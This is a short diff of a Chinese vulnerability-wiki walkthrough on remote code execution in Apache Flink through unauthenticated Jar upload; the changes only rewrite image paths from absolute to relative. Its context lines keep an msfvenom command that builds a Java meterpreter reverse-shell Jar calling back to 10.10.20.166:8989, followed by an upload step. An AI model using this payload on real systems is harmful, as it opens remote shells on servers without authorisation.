@@ -18,15 +18,15 @@ Apache Flink的任意Jar包上传导致远程代码执行的漏洞
 
     msfvenom -p java/meterpreter/reverse_tcp LHOST=10.10.20.166 LPORT=8989 -f jar > rce.jar
 
-![](/Users/aresx/Documents/VulWiki/.resource/ApacheFlinkDashboard未授权访问-远程代码命令执行/media/rId25.png)
+![](./.resource/ApacheFlinkDashboard未授权访问-远程代码命令执行/media/rId25.png)
 
 ### 2、
 
 上传alewong Jar包
 
-![](/Users/aresx/Documents/VulWiki/.resource/ApacheFlinkDashboard未授权访问-远程代码命令执行/media/rId27.png)
+![](./.resource/ApacheFlinkDashboard未授权访问-远程代码命令执行/media/rId27.png)
 
-![](/Users/aresx/Documents/VulWiki/.resource/ApacheFlinkDashboard未授权访问-远程代码命令执行/media/rId28.png)
+![](./.resource/ApacheFlinkDashboard未授权访问-远程代码命令执行/media/rId28.png)
 
 ### 批量脚本
 
